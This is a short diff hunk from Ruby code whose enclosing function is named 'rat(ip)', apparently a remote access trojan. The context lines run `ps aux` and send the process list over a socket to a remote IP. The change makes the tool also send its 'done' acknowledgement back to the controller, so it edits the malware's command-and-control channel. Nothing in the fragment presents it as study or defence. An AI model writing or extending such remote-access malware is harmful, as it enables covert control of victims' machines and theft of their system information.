@@ -85,7 +85,7 @@ def rat(ip)
         else
           socket.puts `ps aux`
         end
-        puts 'done'
+        socket.puts 'done'
       end
     end
     # SocketError, Errno::ECONNREFUSED, Errno::ECONNRESET
